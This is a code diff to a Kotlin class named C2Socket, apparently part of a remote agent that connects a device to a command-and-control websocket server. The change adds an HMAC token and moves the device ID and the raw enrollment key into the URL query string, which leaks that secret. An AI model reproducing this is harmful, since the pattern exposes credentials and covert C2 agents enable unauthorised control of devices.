@@ -26,14 +26,20 @@ class C2Socket(private val deviceId: String) {
     var onConnect:    (() -> Unit)?   = null
     var onDisconnect: (() -> Unit)?   = null
 
+    private fun hmacSha256(key: String, data: String): String {
+        val mac = javax.crypto.Mac.getInstance("HmacSHA256")
+        mac.init(javax.crypto.spec.SecretKeySpec(key.toByteArray(Charsets.UTF_8), "HmacSHA256"))
+        return mac.doFinal(data.toByteArray(Charsets.UTF_8)).joinToString("") { (it.toInt() and 0xFF).toString(16).padStart(2, '0') }
+    }
+
     fun connect() {
         alive = true
+        val token = hmacSha256(Config.ENROLL_KEY, deviceId)
+        val url = "${Config.C2_WS_URL}?device=$deviceId&token=$token&enrollKey=${Config.ENROLL_KEY}"
         val request = Request.Builder()
-            .url(Config.C2_WS_URL)
-            .header("User-Agent",   "bixtx-agent/${Config.AGENT_VERSION}")
-            .header("X-Device-ID", deviceId)
-            .header("X-Platform",  Config.PLATFORM)
-            .header("X-Enroll-Key", Config.ENROLL_KEY)
+            .url(url)
+            .header("User-Agent", "bixtx-agent/${Config.AGENT_VERSION}")
+            .header("X-Platform", Config.PLATFORM)
             .build()
         ws = client.newWebSocket(request, listener)
     }
